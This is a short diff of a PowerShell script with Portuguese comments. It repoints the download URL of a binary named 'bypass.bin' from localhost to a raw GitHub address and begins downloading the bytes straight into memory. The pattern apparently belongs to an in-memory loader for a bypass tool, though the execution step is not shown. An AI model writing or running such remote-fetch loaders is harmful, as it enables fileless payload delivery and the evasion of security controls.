@@ -1,5 +1,5 @@
 # URL do arquivo binário
-$url = "http://localhost:3000/bypass.bin"
+$url = "https://raw.githubusercontent.com/Gstzin/BypassJoker/main/public/bypass.bin"
 
 # Baixar os bytes diretamente para a memória
 $webClient = New-Object System.Net.WebClient
